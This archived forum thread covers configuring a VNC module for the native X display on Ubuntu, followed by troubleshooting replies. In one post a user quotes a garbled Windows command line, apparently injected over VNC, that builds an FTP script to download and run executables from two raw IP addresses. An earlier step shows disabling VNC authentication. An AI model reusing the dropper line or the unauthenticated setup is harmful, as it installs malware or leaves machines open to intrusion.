---
title: "Howto: Remote the native X server (i.e. the &quot;:0&quot; X display) using VNC"
date: 2006-10-17
forum: Outdated Tutorials &amp; Tips
---

### Post by emperor on 2006-10-17
There is a vnc module for X that can be installed which will provide the native :0 X display when connecting remotely with the vncviewer. 

1. Install the "vnc4server" package (universe). This will provide "/usr/lib/xorg/modules/extensions/libvnc.so" (The vnc.so module for VNC 4.1.2 was changed from vnc.so to libvnc.so.)

2. Add "vnc" to the Module section in /etc/X11/xorg.conf
 Section "Module"
          ...
          Load "vnc"
 EndSection

3.a.If your VNC server is running in a secure environment, you can disable authentication with the following configuration:

  Section "Screen"
          ...
          Option "SecurityTypes" "None"
  EndSection

[FONT=Verdana,Arial,Sans-Serif]3.b.[/FONT] If your VNC server is NOT running in a secure environment, you will need  to set a VNC password using the vncpasswd program:    

# vncpasswd
  Password:
  Verify:

Then tell the VNC module where the password is stored in xorg.conf:

Section "Screen"
          ...
          Option "SecurityTypes" "VncAuth"
          Option "UserPasswdVerifier" "VncAuth"
          Option "PasswordFile" "/root/.vnc/passwd"
  EndSection

4. Logout and restart X (Ctrl-Alt Backspace)

References: 
[<http://www.realvnc.com/products/free/4.1/x0.html>]("http://www.realvnc.com/products/free/4.1/x0.html")
[<http://gentoo-wiki.com/HOWTO_Use_TightVNC_W/_JPEG_Compression_to_connect_to_existing_X_Sessions>]("http://gentoo-wiki.com/HOWTO_Use_TightVNC_W/_JPEG_Compression_to_connect_to_existing_X_Sessions")

---

### Post by Foxen on 2006-10-21
Great guide and all, just a word of warning tho... This VNC server seems to dislike the fglrx module(my machine hardlocked) :/

I found another one that does the same, but you will have to start it manually from within your environment... X11vnc, will try out vnc4server on my upcoming fileserver, it's going to be run without a monitor and keyboard, so VNC is the only option.

---

### Post by dbott67 on 2006-10-21
What is the difference/benefit vs. the traditional VNC connection?

Thanks,
Dave

---

### Post by emperor on 2006-10-21
The standard vncserver does not allow connecting  to the visible display :0; the display you would see if a monitor was connected to the computer. Instead it creates another display :1 which is not visible . For a file server or helping a local user on his desktop, you want to connect to the visiable display :0 not :1.

There is another solution, using "X11vnc". But you can only connect as a user if a user is already logged into the computer. In this case, you would have to connect as root, login as a user and the reconnect with X11vnc again as a user.

So, the vnc module for X is somewhat easier to use.

---

### Post by dbott67 on 2006-10-22
> **emperor said:**
> The standard vncserver does not allow connecting  to the visible display :0; the display you would see if a monitor was connected to the computer. Instead it creates another display :1 which is not visible . For a file server or helping a local user on his desktop, you want to connect to the visiable display :0 not :1.

There is another solution, using "X11vnc". But you can only connect as a user if a user is already logged into the computer. In this case, you would have to connect as root, login as a user and the reconnect with X11vnc again as a user.

So, the vnc module for X is somewhat easier to use.

Thanks.  As you can see in the attached screen shot, when I connect using "remote desktop" (aka vino & Terminal Service Client) I get the user desktop :0.  I guess that's one of the differences between vino & VNC.

I also just tried to connect when no one is logged in & I can't --- good to know.  I use VNC at work to manage my XP computers rather then RDP for a few reasons: 'shared' desktop for help-desk as you mentioned above, file transfer & chat... plus cross-platform support for OSX, Linux & MS.  Of course, o\n Windows machines, VNC allows you to install as a service and you can connect even at the CTRL-ALT-DEL login prompt.

Anyhow, thanks for the thorough explanation.

-Dave

---

### Post by emperor on 2006-10-22
vino is actual another solution that I did not address in my previous post. Vino is Gnome specific vnc server and apparently does not start-up until after you login to Gnome.

---

### Post by JayTee on 2006-10-24
I tried this and got it working so I could use vncviewer in Windows to connect. I had originally used the built in vnc in Remote Desktop but that broke when I setup XGL with Beryl. I kept getting grey screens. When I setup vnc4server I got the same problem. I wanted to remote into my 0 session. I then tried X11vnc and it worked fine but it wouldn't prompt me for a password. I've temporarily blocked my 5900 and 5901 ports on my router as the computer is still listening on those with xinetd. I'm not sure where to go next with this. When I tried putting making the changes to xorg.conf and restarted the x-server failed. Thank god I've been using Ubuntu for 2 months now so backup every file before I change it cuz it's soooooo easy to break things in linux when you're a noob. I'm going to keep digging through the how-tos and hope I can find something to help me but if anyone here is running XGL with Beryl 0.1.1 and has a vnc server with authorization working for session 0 and can point me to the right how-to I'd appreciate it.

---

### Post by Foxen on 2006-11-20
That dude who's got a VNC-server setup with XGL/Beryl would then be me, but I am afraid I've got to disappoint you, taking over my screen via VNC from a WinXP machine produces a grand looking desktop with emerald themed windows, but the remote screen doesn't update(the screen on the actual machine you're controlling is changing and updating but it's not helping you) when you try to move stuff around.

Just got Beryl working two days ago and haven't fiddled around too much with anything yet.

---

### Post by Simon Thulbourn on 2006-11-22
Hey,

How do I set the resolution that the VNC server is using?
I don't have a monitor plugged in so it's defaulting at 800x600.

Cheers
Simon

---

### Post by emperor on 2006-11-22
> **Simon Thulbourn said:**
> Hey,

How do I set the resolution that the VNC server is using?
I don't have a monitor plugged in so it's defaulting at 800x600.

Cheers
Simon

According to: [http://www.realvnc.com/products/free/4.1/x0.html](http://www.realvnc.com/products/free/4.1/x0.html)

You should be able to add:

**-geometry ***width*x*height*   
Specify the size of the desktop to be created. Default is said to be 1024x768.

In xorg.conf, for example:

Section "Module"
          ...
          Load "vnc -geometry 1024x768"
  EndSection

However, I have not tried this as 800x600 works for me.

---

### Post by toon on 2006-11-26
Whoa, not so sure I would use this without hardening it further!

After I installed it, I got some text up while I was writing. I got a bit weary, but I convinced myself I probably pasted something or whatever.

So today I wake up, and this is in my run dialog with an error saying it can't be done:

> 
xe /c del i&echo open 195.24.206.88 24609 > i&ech user  1 >> &echo get 438.exe >> i echo qit >> i&ftp-n -s:i &673.e&del &iti&echo open 195.241.171.199 19646 > et 303.exe >> i &echo quit >> i &ftp -n  &303.exe&del i&exit


Clearly some scanner got in! I disabled vnc all together after this. Yes I had vncauth enabled with a 9-character password. However, could it be the password wasn't enabled?

A grep on the xorg logfile shows:
> 
grep -i vnc /var/log/Xorg.0*
/var/log/Xorg.0.log.old:(II) LoadModule: "vnc"
/var/log/Xorg.0.log.old:(II) Loading /usr/lib/xorg/modules/extensions/libvnc.so
/var/log/Xorg.0.log.old:(II) Module vnc: vendor="RealVNC Ltd"
/var/log/Xorg.0.log.old:(II) Loading extension VNC

Nothing about the auth-stuff is mentioned.. I always thought it seemed strange to put the auth stuff under "screen", but according to the [realvnc homepage](http://www.realvnc.com/products/free/4.1/x0.html) that is correct..

---

### Post by emperor on 2006-11-26
> **toon said:**
> Whoa, not so sure I would use this without hardening it further!

I only use this method for vncviewer access behind a firewall. For remote access over the internet, I would recommend running X11vnc inside ssh.

---

### Post by dbott67 on 2006-12-29
Please read this important security vulnerability: 

[http://www.ubuntuforums.org/showthread.php?t=327275](http://www.ubuntuforums.org/showthread.php?t=327275)

-Dave

---

### Post by bunty on 2010-02-14
Nice guide as far as it goes but it forgets the punch line: how to start vncserver :0
```

vncserver :0
A VNC server is already running as :0

```

vncserver :1  works fine and I can use :1 remotely.

So what's the trick to reuse :0 ??

thx

---

### Post by yuretskii on 2010-07-25
sorry for my english...
Ubuntu 10.04 
vnc4server installed

where i can to find file libvnc.so ???

---

